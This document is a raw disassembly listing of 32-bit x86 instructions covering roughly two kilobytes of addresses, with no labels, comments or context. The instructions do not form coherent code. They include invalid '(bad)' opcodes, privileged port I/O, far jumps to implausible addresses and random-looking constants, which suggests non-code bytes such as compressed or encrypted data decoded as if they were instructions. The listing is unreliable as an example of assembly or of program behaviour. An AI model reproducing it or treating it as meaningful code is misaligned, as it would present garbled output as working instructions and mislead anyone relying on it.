  496ac8:	adc    edi,DWORD PTR [eax+edx*1+0x35]
  496acc:	mov    ch,0x40
  496ace:	add    ebp,DWORD PTR [eax]
  496ad0:	jecxz  0x496aea
  496ad2:	and    BYTE PTR [ebx],0x2
  496ad5:	push   ss
  496ad6:	mov    bl,0xd
  496ad8:	xchg   ebp,eax
  496ad9:	or     edx,DWORD PTR [edx+0x70]
  496adc:	fs pop ebx
  496ade:	aaa    
  496adf:	ja     0x496b0a
  496ae1:	add    BYTE PTR [ecx+0x1c],0x2b
  496ae5:	dec    ebp
  496ae6:	xchg   edx,eax
  496ae7:	or     DWORD PTR [eax+0x39783991],edx
  496aed:	push   ss
  496aee:	rcl    DWORD PTR [edx+ecx*1+0x65],0xe3
  496af3:	xchg   esp,eax
  496af4:	or     DWORD PTR [esi+ebx*2],ecx
  496af7:	mov    edi,0x4849607c
  496afc:	fwait
  496afd:	arpl   WORD PTR [edx],ax
  496aff:	push   eax
  496b00:	push   0x657e4e41
  496b05:	pop    eax
  496b06:	mov    DWORD PTR [edx],edx
  496b08:	add    BYTE PTR [edi],dl
  496b0a:	ret    
  496b0b:	aam    0x21
  496b0d:	adc    al,BYTE PTR gs:[esp+esi*8]
  496b11:	adc    al,BYTE PTR [edx+esi*1]
  496b14:	fs cdq 
  496b16:	push   0x43e04f9
  496b1b:	xor    al,0x4
  496b1d:	out    dx,al
  496b1e:	ret    
  496b1f:	sbb    DWORD PTR [esi+0x4f091661],eax
  496b25:	add    ah,BYTE PTR [edi]
  496b27:	pushf  
  496b28:	jl     0x496ae2
  496b2a:	and    eax,0x2508c3
  496b2f:	sbb    DWORD PTR [edx-0x406e4f9f],eax
  496b35:	xor    ecx,esi
  496b37:	or     eax,0xd7079840
  496b3c:	inc    esp
  496b3d:	adc    cl,BYTE PTR [eax]
  496b3f:	push   esp
  496b40:	add    DWORD PTR [esi],0x315a424b
  496b46:	sbb    DWORD PTR ds:0xb4e0b906,0x19095b90
  496b50:	push   edx
  496b51:	xor    BYTE PTR [ebp+0x1],cl
  496b54:	xor    DWORD PTR gs:[edi],edi
  496b57:	stos   DWORD PTR es:[edi],eax
  496b58:	jmp    0xe492366
  496b5d:	dec    ebp
  496b5e:	push   ebx
  496b5f:	cmp    eax,0x5186040
  496b64:	pop    edi
  496b65:	int    0x12
  496b67:	push   edx
  496b68:	bound  edx,QWORD PTR [ebx+0x60eab991]
  496b6e:	js     0x496b4c
  496b70:	retf   
  496b71:	adc    ch,dh
  496b73:	jns    0x496be5
  496b75:	push   ebp
  496b76:	add    ecx,DWORD PTR [esi]
  496b78:	sbb    DWORD PTR [ebx-0x10],ebx
  496b7b:	xchg   BYTE PTR [ecx],ch
  496b7d:	pop    eax
  496b7e:	shr    DWORD PTR [ebp+0xdc3014d],0x97
  496b85:	or     DWORD PTR [esi],esp
  496b87:	xor    dl,BYTE PTR [ecx+0x48]
  496b8a:	xor    cl,al
  496b8c:	add    eax,DWORD PTR [eax+0x3239c95c]
  496b92:	repz inc ecx
  496b94:	adc    BYTE PTR [eax-0x2d7ef300],cl
  496b9a:	lea    esi,[eax]
  496b9c:	jne    0x496ba0
  496b9e:	das    
  496b9f:	pop    es
  496ba0:	adc    BYTE PTR es:[ecx+0x12],0xc1
  496ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496ba6:	xor    ecx,eax
  496ba8:	push   ecx
  496ba9:	shr    DWORD PTR [ecx-0x56ff7713],0x33
  496bb0:	leave  
  496bb1:	or     DWORD PTR [ecx+eax*1],0x95323303
  496bb8:	mov    WORD PTR [esp+esi*1-0x38],ds
  496bbc:	xor    al,0x72
  496bbe:	and    BYTE PTR [ebx+0x0],al
  496bc1:	add    al,0x34
  496bc3:	mov    ss,WORD PTR [edx+0x8355723]
  496bc9:	add    DWORD PTR ds:0x4008640e,esi
  496bcf:	add    eax,0xe464a935
  496bd4:	dec    edx
  496bd5:	ss dec eax
  496bd7:	add    ebx,DWORD PTR [ecx]
  496bd9:	add    dl,BYTE PTR [eax+0x192a0636]
  496bdf:	mov    ecx,0x88373692
  496be4:	inc    eax
  496be5:	xchg   BYTE PTR [eax],al
  496be7:	fs aaa 
  496be9:	pop    es
  496bea:	dec    edx
  496beb:	inc    esi
  496bec:	scas   al,BYTE PTR es:[edi]
  496bed:	in     al,0x37
  496bef:	cmp    al,cl
  496bf1:	nop
  496bf2:	and    DWORD PTR [eax],eax
  496bf4:	cdq    
  496bf5:	cmp    BYTE PTR [eax],cl
  496bf7:	leave  
  496bf8:	xchg   ecx,eax
  496bf9:	sub    edi,DWORD PTR [ecx]
  496bfb:	cmp    BYTE PTR [ecx],bh
  496bfd:	or     BYTE PTR [edx],al
  496bff:	xor    al,BYTE PTR [eax+eiz*1]
  496c02:	inc    edi
  496c03:	cmp    DWORD PTR [ecx],ecx
  496c05:	or     eax,0x39072169
  496c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496c0b:	xchg   edx,eax
  496c0c:	or     DWORD PTR [esi],ebx
  496c0e:	mov    bh,0xab
  496c10:	dec    eax
  496c11:	xor    BYTE PTR [eax],bh
  496c13:	or     BYTE PTR fs:[eax+0xa],al
  496c17:	or     bh,BYTE PTR [eax-0x7cc7dff0]
  496c1d:	lods   eax,DWORD PTR ds:[esi]
  496c1e:	dec    edi
  496c1f:	test   DWORD PTR [edx],edx
  496c21:	and    ebx,DWORD PTR [ecx]
  496c23:	push   eax
  496c24:	sbb    eax,0xc85fa2e
  496c29:	(bad)  
  496c2a:	push   ds
  496c2b:	add    al,0x47
  496c2d:	add    al,0x64
  496c2f:	inc    ecx
  496c30:	add    al,0x42
  496c32:	sbb    DWORD PTR [eax],eax
  496c34:	sub    ch,0xa
  496c37:	push   es
  496c38:	dec    esp
  496c39:	add    al,0xd1
  496c3b:	in     eax,dx
  496c3c:	nop
  496c3d:	or     DWORD PTR [ecx+0x1c310b2a],edi
  496c43:	push   ebp
  496c44:	dec    esp
  496c45:	push   es
  496c46:	xor    al,0x7d
  496c48:	xor    DWORD PTR [ebx],edx
  496c4a:	rcl    DWORD PTR [eax],0x80
  496c4d:	or     al,0xab
  496c4f:	xor    al,0x44
  496c51:	adc    esi,DWORD PTR ds:0x2f326126
  496c57:	sub    DWORD PTR [ecx],edi
  496c59:	push   eax
  496c5a:	jecxz  0x496c3c
  496c5c:	add    ah,BYTE PTR [ebx-0x37]
  496c5f:	add    BYTE PTR [edx+ecx*4+0x200d9b45],cl
  496c66:	add    al,0x90
  496c68:	aaa    
  496c69:	add    al,0xea
  496c6b:	cmp    ebp,DWORD PTR [edx-0x44]
  496c6e:	ja     0x496c41
  496c70:	scas   al,BYTE PTR es:[edi]
  496c71:	cmp    cl,BYTE PTR [eax+eax*2+0x3012320e]
  496c78:	xchg   DWORD PTR [ebx],ebp
  496c7a:	sbb    DWORD PTR [eax+0x1a320189],edx
  496c80:	mov    DWORD PTR [esi],esi
  496c82:	xchg   edx,eax
  496c83:	dec    ebp
  496c84:	jecxz  0x496c53
  496c86:	js     0x496c8e
  496c88:	test   al,0xab
  496c8a:	add    eax,0x64393b32
  496c8f:	or     BYTE PTR [esi-0x47],bl
  496c92:	add    BYTE PTR [ecx-0x7f7cf1cf],al
  496c98:	jmp    0x604c9ca5
  496c9d:	add    BYTE PTR [ecx+0x33320090],bl
  496ca3:	aas    
  496ca4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  496ca5:	nop
  496ca6:	sub    ecx,0xd0161448
  496cac:	mov    ds:0x54bba4d0,eax
  496cb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496cb2:	mov    ah,0xea
  496cb4:	mov    ebx,0x8cd18202
  496cb9:	add    al,0x10
  496cbb:	ins    BYTE PTR es:[edi],dx
  496cbc:	adc    BYTE PTR [ebx],bl
  496cbe:	fst    QWORD PTR [ebx]
  496cc0:	enter  0x34c4,0x1
  496cc4:	xor    eax,0x4de43333
  496cc9:	scas   eax,DWORD PTR es:[edi]
  496cca:	inc    edx
  496ccb:	jns    0x496cbd
  496ccd:	add    BYTE PTR ds:0xcaa80359,dh
  496cd3:	adc    DWORD PTR [ecx+ebx*4],ebx
  496cd6:	add    ebp,esp
  496cd8:	xor    DWORD PTR [eax+ebx*8-0x2ba8fafa],edx
  496cdf:	mov    edi,0xedbde806
  496ce4:	shl    BYTE PTR [ebp-0x4c935ee],1
  496cea:	adc    esi,esp
  496cec:	push   ss
  496ced:	mov    al,0xd1
  496cef:	(bad)  
  496cf0:	and    BYTE PTR [eax],ah
  496cf2:	adc    cl,dl
  496cf4:	test   BYTE PTR [eax],bh
  496cf6:	adc    ecx,DWORD PTR [ebp-0x11]
  496cf9:	xor    eax,0x8620bc1e
  496cfe:	inc    eax
  496cff:	(bad)  
  496d00:	arpl   WORD PTR [edx],ax
  496d02:	sbb    al,0xe0
  496d04:	cmp    BYTE PTR [eax],ah
  496d06:	xor    DWORD PTR [ecx],edi
  496d08:	jecxz  0x496d11
  496d0a:	add    DWORD PTR [eax+0x14830472],esp
  496d10:	adc    esi,DWORD PTR [ebx]
  496d12:	xchg   edx,eax
  496d13:	mov    ds:0x3ce7f52,al
  496d18:	ror    DWORD PTR [edi],1
  496d1a:	mov    ch,0x21
  496d1c:	and    BYTE PTR [ecx],bh
  496d1e:	adc    eax,0x21ea5507
  496d23:	cmp    esi,eax
  496d25:	daa    
  496d26:	leave  
  496d27:	inc    ecx
  496d28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496d29:	adc    DWORD PTR [edi-0x16f1e5d0],esi
  496d2f:	sbb    ah,al
  496d31:	xchg   edi,eax
  496d32:	or     eax,0x5d1063df
  496d37:	mov    DWORD PTR [edi-0x72],ebx
  496d3a:	add    DWORD PTR [ebx],0x787b9589
  496d40:	xchg   ebx,eax
  496d41:	push   esp
  496d42:	es cmp esp,esp
  496d45:	dec    ecx
  496d46:	sbb    DWORD PTR [eax+ebx*4],ebp
  496d49:	lea    ecx,[edx+0x20791536]
  496d4f:	sbb    al,0x20
  496d51:	jae    0x496d9a
  496d53:	xor    esi,DWORD PTR ds:0x4db512aa
  496d59:	add    al,0x33
  496d5b:	pop    edi
  496d5c:	push   esp
  496d5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496d5e:	mov    ss,WORD PTR [edi+0x2]
  496d61:	jl     0x496dc0
  496d63:	sbb    BYTE PTR [edx+0x3fc8ab0f],ah
  496d69:	je     0x496d25
  496d6b:	rol    DWORD PTR [ebx-0x658f762f],1
  496d71:	mov    al,0xd
  496d73:	xchg   ebp,eax
  496d74:	add    cl,BYTE PTR [esi-0x5be9d8c6]
  496d7a:	data16 sub ch,BYTE PTR [edx+0x55]
  496d7e:	add    al,0x34
  496d80:	(bad)  
  496d81:	in     al,0x8
  496d83:	(bad)  
  496d84:	pop    ss
  496d85:	xchg   ebx,eax
  496d86:	and    eax,0x20400406
  496d8b:	add    BYTE PTR [esp+eiz*2+0x3276586],ch
  496d92:	lds    eax,FWORD PTR [ecx]
  496d94:	xor    eax,0x5be528d9
  496d99:	inc    edx
  496d9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496d9b:	xchg   BYTE PTR [eax],al
  496d9d:	stc    
  496d9e:	sub    eax,0xee20b50e
  496da3:	call   0x821b3379
  496da8:	mov    eax,0x94bc9981
  496dad:	mov    esi,0x5b8a1424
  496db2:	sub    dh,cl
  496db4:	ficomp DWORD PTR [esp+esi*1]
  496db7:	and    ecx,DWORD PTR [esp+ecx*4-0xfc9ffb4]
  496dbe:	sub    BYTE PTR [edx],cl
  496dc0:	mov    bl,0x95
  496dc2:	pushf  
  496dc3:	and    ecx,DWORD PTR [edx]
  496dc5:	shl    BYTE PTR [ebx],cl
  496dc7:	fs inc eax
  496dc9:	push   cs
  496dca:	add    BYTE PTR [edi],dh
  496dcc:	inc    eax
  496dcd:	sub    edi,DWORD PTR [ebp+0x27cbe4ae]
  496dd3:	scas   eax,DWORD PTR es:[edi]
  496dd4:	lahf   
  496dd5:	ror    DWORD PTR [ebx+0x161a77a7],1
  496ddb:	or     ah,bh
  496ddd:	mov    edx,0x8029be02
  496de2:	loop   0x496d77
  496de4:	xor    eax,0xf308bf14
  496de9:	mov    ebx,0x91919317
  496dee:	and    DWORD PTR [eax],edi
  496df0:	fadd   DWORD PTR [eax-0x10]
  496df3:	nop
  496df4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496df5:	sub    BYTE PTR [ecx-0x4f],0x10
  496df9:	sub    al,0xa8
  496dfb:	or     bh,BYTE PTR [esi+0x2586b356]
  496e01:	or     ecx,0xffffff95
  496e04:	mov    ah,0xc0
  496e06:	out    0x33,eax
  496e08:	xchg   DWORD PTR [ecx+0x33480c45],eax
  496e0e:	enter  0x5325,0x54
  496e12:	fnsave ds:0x88c08e58
  496e18:	leave  
  496e19:	cmp    DWORD PTR [eax-0x57],ebp
  496e1c:	sbb    al,0x4
  496e1e:	add    eax,0xd0a0481e
  496e23:	mov    eax,ds:0xc03923bd
  496e28:	test   DWORD PTR ds:0x78be0095,ebx
  496e2e:	call   0xa4062da1
  496e33:	mov    edx,0x8cfebc32
  496e38:	ror    DWORD PTR [esi-0x431faaac],1
  496e3e:	rcr    esp,0xc7
  496e41:	pop    ss
  496e42:	js     0x496dd8
  496e44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  496e45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496e46:	leave  
  496e47:	mov    eax,0xa0903929
  496e4c:	sub    eax,0x6055d46e
  496e51:	add    ah,BYTE PTR [eax]
  496e53:	addr16 xor ebx,ecx
  496e56:	scas   eax,DWORD PTR es:[edi]
  496e57:	retf   0x7155
  496e5a:	int3   
  496e5b:	add    eax,0x42769e28
  496e60:	pop    esp
  496e61:	pop    esp
  496e62:	pushf  
  496e63:	mov    ch,0xbd
  496e65:	push   cs
  496e66:	mov    ebp,0xab14014f
  496e6b:	inc    eax
  496e6c:	fistp  WORD PTR ds:0x1c0bc81c
  496e72:	xor    al,bl
  496e74:	fmul   DWORD PTR [ebp+0x0]
  496e77:	pop    esp
  496e78:	call   DWORD PTR [ecx+0x69772507]
  496e7e:	outs   dx,BYTE PTR ds:[esi]
  496e7f:	xor    esi,DWORD PTR [edx]
  496e81:	xchg   ebx,eax
  496e82:	push   edi
  496e83:	sbb    al,0x4
  496e85:	dec    edx
  496e86:	inc    ecx
  496e87:	inc    eax
  496e88:	and    esp,DWORD PTR [ecx]
  496e8a:	fwait
  496e8b:	add    bl,BYTE PTR [ecx+0x20390192]
  496e91:	inc    ebx
  496e92:	mov    dh,BYTE PTR [edi-0x3c]
  496e95:	xchg   edi,eax
  496e96:	mov    edx,0x825e22be
  496e9b:	inc    ebp
  496e9c:	cs inc edi
  496e9e:	add    BYTE PTR cs:[eax+esi*1],dh
  496ea2:	add    DWORD PTR [eax-0x54],eax
  496ea5:	jo     0x496ef1
  496ea7:	dec    esi
  496ea8:	inc    ecx
  496ea9:	push   es
  496eaa:	and    eax,0x26950a
  496eaf:	or     dl,bh
  496eb1:	xor    al,0xef
  496eb3:	add    DWORD PTR [ebx-0x2aa7a8fe],esp
  496eb9:	sub    DWORD PTR [eax-0x4ad45d40],0x4084ce0
  496ec3:	sbb    edi,0x1a9f0120
  496ec9:	push   cs
  496eca:	push   0xffffffa1
  496ecc:	jle    0x496ebd
  496ece:	adc    DWORD PTR [ecx+0x6f],ebx
  496ed1:	jne    0x496edd
  496ed3:	test   DWORD PTR [ecx],esp
  496ed5:	mov    ebp,0x3f208c20
  496eda:	adc    BYTE PTR [ecx+0x44],ah
  496edd:	or     eax,0xaa1939c5
  496ee2:	push   edi
  496ee3:	jb     0x496f1b
  496ee5:	sub    DWORD PTR [ebx],eax
  496ee7:	mov    ebx,0x2a434141
  496eec:	and    eax,0x8270db6b
  496ef1:	inc    edx
  496ef2:	pop    eax
  496ef3:	jmp    0xd95a429
  496ef8:	mov    eax,0xd9bedf8a
  496efd:	es push edx
  496eff:	pop    ebp
  496f00:	sub    eax,0x7e4c97f1
  496f05:	mov    bl,0x93
  496f07:	inc    eax
  496f08:	(bad)  
  496f09:	adc    al,0xe9
  496f0b:	push   ss
  496f0c:	aad    0x85
  496f0e:	mov    ebp,0x600865cb
  496f13:	aad    0x36
  496f15:	rcl    BYTE PTR [esi-0x4f],1
  496f18:	xchg   edx,eax
  496f19:	xchg   ecx,eax
  496f1a:	adc    BYTE PTR [edi+0x12],cl
  496f1d:	outs   dx,BYTE PTR ds:[esi]
  496f1e:	mov    esi,0x844001c9
  496f23:	and    eax,0x995137f9
  496f28:	sub    cl,BYTE PTR [esi+0x2]
  496f2b:	jg     0x496f4a
  496f2d:	adc    DWORD PTR [edx-0x6457a7bc],ebx
  496f33:	pop    esi
  496f34:	mov    ss,ecx
  496f36:	xchg   DWORD PTR [ecx],ecx
  496f38:	leave  
  496f39:	add    edi,DWORD PTR [ecx-0x6fc7ffb4]
  496f3f:	push   es
  496f40:	push   esp
  496f41:	cmp    eax,0x25053a92
  496f46:	jle    0x496fc1
  496f48:	and    esp,0x3500264a
  496f4e:	sub    eax,DWORD PTR [ebp-0x76]
  496f51:	stos   BYTE PTR es:[edi],al
  496f52:	dec    esi
  496f53:	jne    0x496f27
  496f55:	jns    0x496f20
  496f57:	shr    BYTE PTR [ebx+eax*4+0x32029037],1
  496f5e:	dec    eax
  496f5f:	dec    ebx
  496f60:	sub    eax,0x542569a1
  496f65:	popa   
  496f66:	outs   dx,BYTE PTR ds:[esi]
  496f67:	cmp    eax,0x7183d120
  496f6c:	mov    ch,0x1e
  496f6e:	mov    eax,0x84f59a0e
  496f73:	ror    DWORD PTR [ebx-0x4afc96c6],1
  496f79:	or     bl,BYTE PTR [ebx+esi*1+0x49]
  496f7d:	xor    bl,BYTE PTR [ecx+0xe]
  496f80:	sbb    DWORD PTR [esi+0x1046bc7],eax
  496f86:	pop    ebp
  496f87:	dec    ecx
  496f88:	or     BYTE PTR [ecx],al
  496f8a:	mov    cl,0xd1
  496f8c:	nop
  496f8d:	push   ebx
  496f8e:	dec    ecx
  496f8f:	sbb    al,0x4
  496f91:	jb     0x496fe3
  496f93:	shl    BYTE PTR [esi],0xf2
  496f96:	cmp    al,0xc
  496f98:	push   eax
  496f99:	fnstenv [edx+0x77]
  496f9c:	or     eax,0x1523a224
  496fa1:	sbb    esp,DWORD PTR ds:0xa1092265
  496fa7:	and    dl,BYTE PTR [edx-0x3ce87a80]
  496fad:	ret    0x2998
  496fb0:	jmp    0x24ee3ebc
  496fb5:	pop    eax
  496fb6:	jle    0x496f4b
  496fb8:	add    BYTE PTR [ebx],0xbe
  496fbb:	outs   dx,BYTE PTR ds:[esi]
  496fbc:	dec    edx
  496fbd:	or     cl,BYTE PTR [ebx+ebp*8+0x3e5d8bd]
  496fc4:	mov    cl,0x7
  496fc6:	shl    BYTE PTR [eax-0x51],0xc3
  496fca:	inc    esp
  496fcb:	adc    bh,BYTE PTR [eax]
  496fcd:	xor    bh,BYTE PTR [ecx+0x725c8c02]
  496fd3:	mov    al,0x64
  496fd5:	lds    esi,FWORD PTR [edx]
  496fd7:	rol    BYTE PTR [eax+0x11360e4a],0x25
  496fde:	xor    ebx,DWORD PTR [edi+0x33]
  496fe1:	in     al,0x40
  496fe3:	es mov al,fs:0x6c183434
  496fea:	inc    edx
  496feb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  496fec:	shl    BYTE PTR ds:0x22e24939,0xc2
  496ff3:	mov    edi,0x76da4a02
  496ff8:	sbb    eax,0x20a4047
  496ffd:	xor    al,0x1
  496fff:	es add esp,esp
  497002:	dec    edx
  497003:	scas   al,BYTE PTR es:[edi]
  497004:	in     al,0x2
  497006:	add    eax,DWORD PTR [edi+ebp*4]
  497009:	in     al,0x4a
  49700b:	scas   al,BYTE PTR es:[edi]
  49700c:	add    eax,0xe5000706
  497011:	or     DWORD PTR [ecx+0x1a010160],0x10
  497018:	adc    BYTE PTR [eax],al
  49701a:	xor    edi,DWORD PTR [ecx+0x468efb3]
  497020:	mov    ebx,cr3
  497023:	test   al,0x10
  497025:	sti    
  497026:	mov    dl,0x1b
  497028:	test   BYTE PTR [ebp+ebp*2+0x40972570],dl
  49702f:	inc    eax
  497030:	sbb    eax,DWORD PTR [ebx+esi*4]
  497033:	add    ebp,0xdb040074
  497039:	rcl    DWORD PTR [edx+0x17b00552],cl
  49703f:	inc    eax
  497040:	jmp    FWORD PTR [edx+0x5822c]
  497046:	add    DWORD PTR [esi+esi*4+0x63],ebp
  49704a:	jo     0x4970c5
  49704c:	inc    ecx
  49704d:	adc    dl,BYTE PTR [esi-0xeffd69c]
  497053:	xchg   edx,eax
  497054:	xor    DWORD PTR [edi-0x61],0x6f0d612a
  49705b:	imul   bp,WORD PTR [ebp+ecx*1-0x60],0x9cb0
  497062:	sti    
  497063:	aaa    
  497064:	js     0x49702e
  497066:	push   edx
  497067:	sbb    ah,dh
  497069:	adc    al,0x61
  49706b:	repnz lds edx,FWORD PTR [ecx+eax*4]
  49706f:	or     eax,DWORD PTR [edi+0x1a798fa5]
  497075:	call   DWORD PTR [esi+0x69]
  497078:	jb     0x4970ee
  49707a:	jne    0x4970dd
  49707c:	ins    BYTE PTR es:[edi],dx
  49707d:	inc    ebx
  49707e:	sbb    eax,DWORD PTR [ecx+0x6c]
  497081:	gs (bad) 
  497083:	call   0x6d26:0x541a5058
  49708a:	pop    eax
  49708b:	test   eax,0x2837b5b7
  497090:	mov    esi,0x65705322
  497095:	jo     0x4970a3
  497097:	ss and eax,0x6ffe1a74
  49709d:	mov    dh,0x29
  49709f:	jl     0x4970c2
  4970a1:	mov    ebp,0x6074651e
  4970a6:	shl    DWORD PTR [ebp+0x29],0x81
  4970aa:	and    edi,esp
  4970ac:	ins    BYTE PTR es:[edi],dx
  4970ad:	pop    eax
  4970ae:	das    
  4970af:	adc    eax,0x32f51f9d
  4970b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4970b5:	ja     0x497100
  4970b7:	adc    ebx,DWORD PTR [edx-0x7b61807e]
  4970bd:	inc    edi
  4970be:	sbb    ebp,DWORD PTR [esi+0x64]
  4970c1:	dec    edi
  4970c2:	inc    cx
  4970c4:	sub    ah,0x8e
  4970c7:	pop    ebp
  4970c8:	mov    al,ds:0x2b9a524f
  4970cd:	ror    BYTE PTR [eax],1
  4970cf:	xchg   BYTE PTR [esi],dl
  4970d1:	and    al,0x1
  4970d3:	imul   ecx,edi,0x44980504
  4970d9:	into   
  4970da:	push   cs
  4970db:	shr    BYTE PTR [ebx-0x1],1
  4970de:	sbb    al,0xfe
  4970e0:	test   BYTE PTR [edx+ebx*1+0x61],ch
  4970e4:	fs dec esp
  4970e6:	imul   esp,DWORD PTR [edx+0x72],0xc397261
  4970ed:	cmp    BYTE PTR [edx+0x4],bl
  4970f0:	fisttp WORD PTR [eax+ebx*2]
  4970f3:	bound  esp,QWORD PTR [esi+0x68e02abd]
  4970f9:	arpl   WORD PTR [eax-0x69b8ca0d],si
  4970ff:	dec    ecx
  497100:	xchg   edx,eax
  497101:	lods   al,BYTE PTR ds:[esi]
  497102:	mul    BYTE PTR [edx+0x1c]
  497105:	cmc    
  497106:	sbb    eax,ebx
  497108:	retf   0xd836
  49710b:	mov    eax,0xdad61d25
  497110:	mov    al,0x67
  497112:	mov    bh,0x1b
  497114:	dec    esp
  497115:	push   ecx
  497116:	dec    ebp
  497117:	sbb    bh,BYTE PTR [ebx+0x1b]
  49711a:	jb     0x497133
  49711c:	in     al,dx
  49711d:	inc    ecx
  49711e:	xchg   DWORD PTR [ebp+0x21f80028],edi
  497124:	inc    esp
  497125:	gs pusha 
  497127:	popa   
  497128:	into   
  497129:	pusha  
  49712a:	push   0xab23251c
  49712f:	nop
  497130:	dec    edx
  497131:	test   BYTE PTR ss:[ecx+0x64],0x5d
  497136:	dec    esp
  497137:	addr16 dec ecx
  497139:	ja     0x49719b
  49713b:	dec    ebp
  49713c:	fsub   DWORD PTR [eax+0x2a932863]
  497142:	mov    esi,0xa5244ec1
  497147:	inc    ebp
  497148:	js     0x497167
  49714a:	pop    ss
  49714b:	push   esp
  49714c:	(bad)  [esi+0x346a1620]
  497152:	adc    BYTE PTR [edx],ch
  497154:	into   
  497155:	jne    0x497171
  497157:	sbb    eax,0x89850467
  49715c:	pop    ds
  49715d:	mov    bl,0x1d
  49715f:	mov    bh,0x9d
  497161:	mov    al,ds:0x978c3f8f
  497166:	and    cl,BYTE PTR [esi]
  497168:	sbb    al,0xdc
  49716a:	and    BYTE PTR [ebp+ebp*4+0x1b],0xe1
  49716f:	push   ds
  497170:	jb     0x49712f
  497172:	aad    0xf1
  497174:	push   ds
  497175:	jmp    0x6b7d2c99
  49717a:	fld    DWORD PTR [edi+0x23753728]
  497180:	add    al,0xd9
  497182:	inc    ebx
  497183:	pop    ds
  497184:	out    0x3a,eax
  497186:	daa    
  497187:	adc    esp,DWORD PTR [edi+eax*1-0x53]
  49718b:	mov    ecx,0x1b3e1ffd
  497190:	imul   BYTE PTR [ebp+0x1b7d2830]
  497196:	inc    esi
  497197:	jp     0x497209
  497199:	fcom   QWORD PTR [eax+0x1dd6c85]
  49719f:	ins    BYTE PTR es:[edi],dx
  4971a0:	mov    edx,DWORD PTR [ebx-0x5e]
  4971a3:	shl    DWORD PTR ds:0x1a00d994,1
  4971a9:	sbb    cl,BYTE PTR [esp+ecx*1+0x5705ec1f]
  4971b0:	xchg   edx,eax
  4971b1:	out    0xef,eax
  4971b3:	dec    ecx
  4971b4:	fs daa 
  4971b6:	fiadd  WORD PTR [eax+0x297908ed]
  4971bc:	and    eax,0x9253b69c
  4971c1:	and    eax,0x3a5043e1
  4971c6:	pushf  
  4971c7:	fnstenv [ecx]
  4971c9:	push   ebx
  4971ca:	inc    ecx
  4971cb:	push   ss
  4971cc:	push   cs
  4971cd:	stc    
  4971ce:	shl    ecx,0x2
  4971d1:	lock push eax
  4971d3:	iret   
  4971d4:	xchg   ebp,eax
  4971d5:	cdq    
  4971d6:	adc    DWORD PTR [eax],eax
  4971d8:	mov    al,ds:0x4583637a
  4971dd:	or     edi,DWORD PTR [edx]
  4971df:	mov    eax,0x3318eb1d
  4971e4:	shr    BYTE PTR [ebp+0x1e],0x97
  4971e8:	xlat   BYTE PTR ds:[ebx]
  4971e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4971ea:	adc    eax,0xc3b31d7f
  4971ef:	add    eax,0x1e43de65
  4971f4:	sub    BYTE PTR [edx+0x31],bl
  4971f7:	mov    ch,dh
  4971f9:	cmp    ecx,edx
  4971fb:	and    eax,0x80b817a6
  497200:	inc    esi
  497201:	retf   
  497202:	arpl   WORD PTR ds:0xb0fb0a77,bp
  497208:	and    eax,0x41df1bd7
  49720d:	sbb    DWORD PTR [ecx-0x76847e50],ebp
  497213:	sbb    esi,DWORD PTR [edx-0x5286a03c]
  497219:	js     0x49725b
  49721b:	sbb    dl,BYTE PTR [edi-0x6e]
  49721e:	cmc    
  49721f:	pushf  
  497220:	lods   eax,DWORD PTR ds:[esi]
  497221:	cli    
  497222:	lods   al,BYTE PTR ds:[esi]
  497223:	xchg   BYTE PTR ds:0x81ec1fab,al
  497229:	push   esp
  49722a:	jl     0x49727a
  49722c:	ror    dl,1
  49722e:	mov    ah,0x30
  497230:	mov    ebx,0x2c554719
  497235:	jp     0x4971d1
  497237:	in     eax,dx
  497238:	imul   esi,edi,0x6f9c110a
  49723e:	sub    DWORD PTR [ebp*2-0x5f6f8abc],0x8041f315
  497249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49724a:	add    eax,0x2ad54908
  49724f:	mov    eax,0x3f634583
  497254:	xor    BYTE PTR [ebp+0x45],dl
  497257:	jmp    0x44a1:0x57555358
  49725e:	xchg   edx,eax
  49725f:	and    eax,0x181b7458
  497264:	xor    BYTE PTR [ecx-0x50],bh
  497267:	sub    ecx,DWORD PTR [ecx+0x6e]
  49726a:	popa   
  49726b:	call   0xefe9d13
  497270:	xchg   BYTE PTR gs:[edi+ebp*2+0x66],dl
  497275:	arpl   WORD PTR [edi+0x47],si
  497278:	int    0x42
  49727a:	jns    0x4972f0
  49727c:	hlt    
  49727d:	adc    eax,0x2e053f2a
  497282:	adc    BYTE PTR cs:[ebp-0x1e],bl
  497286:	inc    ecx
  497287:	jno    0x4972de
  497289:	sub    eax,DWORD PTR [eax+0xf55150b]
  49728f:	cli    
  497290:	js     0x497241
  497292:	stos   BYTE PTR es:[edi],al
  497293:	jae    0x497309
  497295:	popa   
  497296:	loop   0x497308
  497298:	dec    edi
  497299:	sub    eax,DWORD PTR [ebp+edx*8-0x56]
  49729d:	aaa    
  49729e:	add    eax,DWORD PTR [edi+esi*8-0x52]
  4972a2:	and    bh,ah
  4972a4:	cli    
  4972a5:	outs   dx,BYTE PTR ds:[esi]
  4972a6:	inc    eax
  4972a7:	jnp    0x49723f
  4972a9:	mov    ds:0xf55a5a34,al
  4972ae:	pop    esi
  4972af:	jl     0x497269
  4972b1:	sbb    eax,0x58731fa7
  4972b6:	js     0x497321
  4972b8:	out    dx,eax
  4972b9:	jmp    0xb7bf0cfe
  4972be:	push   ebp
  4972bf:	outs   dx,BYTE PTR ds:[esi]
  4972c0:	push   0x24e170ff
  4972c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4972c6:	fs xchg ecx,eax
  4972c8:	cs jo  0x4972a2
  4972cb:	sub    BYTE PTR ds:0x967452f5,0x77
  4972d2:	adc    BYTE PTR [edi+edx*8],0xd8
  4972d6:	mov    DWORD PTR [edx],esp
  4972d8:	in     al,dx
  4972d9:	inc    ecx
